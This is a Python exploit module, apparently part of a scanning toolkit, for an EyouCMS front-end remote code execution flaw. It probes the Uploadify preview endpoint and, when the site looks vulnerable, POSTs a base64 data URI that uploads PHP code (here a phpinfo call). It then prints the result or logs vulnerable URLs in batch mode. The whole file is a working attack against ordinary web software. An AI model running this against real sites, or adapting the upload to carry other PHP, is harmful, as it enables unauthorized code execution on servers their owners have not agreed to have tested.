#!/user/bin/env python3
# -*- coding: utf-8 -*-
import requests
from pub.com.outprint import OutPrintInfo
from pub.com.reqset import ReqSet
import urllib3
import json
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class EyouCMS_RCE_Scan:
    def main(self,target):
        self.batch = target["batch_work"]
        baseurl = target['url'].strip("/ ")
        self.ssl = target["ssl"]
        self.header = target["header"]
        proxy = target["proxy"]
        timeout = target["timeout"]
        _, self.proxy = ReqSet(proxy=proxy)
        if not self.batch:
            OutPrintInfo("EyouCMS", "开始检测EyouCMS前台RCE...")
        url = baseurl + '/index.php/api/Uploadify/preview'
        data = "data:image/php;base64,PD9waHAgcGhwaW5mbygpOw=="
        try:
            resp2 = requests.get(url,verify=self.ssl,proxies=self.proxy,headers=self.header,timeout=timeout)
            if "jsonrpc" in resp2.text:
                OutPrintInfo("EyouCMS","目标存在漏洞")
                if self.batch:
                    OutPutFile("eyoucms_rce_scan.txt",f"目标存在漏洞: {url}")
                    return
                resp = requests.post(url,verify=self.ssl,proxies=self.proxy,headers=self.header,data=data,timeout=timeout)
                res = json.loads(resp.text)
                OutPrintInfo("EyouCMS",f"PHPINFO: {res.get('result')}")
        except Exception:
            OutPrintInfo("EyouCMS","目标请求出错")
        if not self.batch:
            OutPrintInfo("EyouCMS","EyouCMS前台RCE检测结束")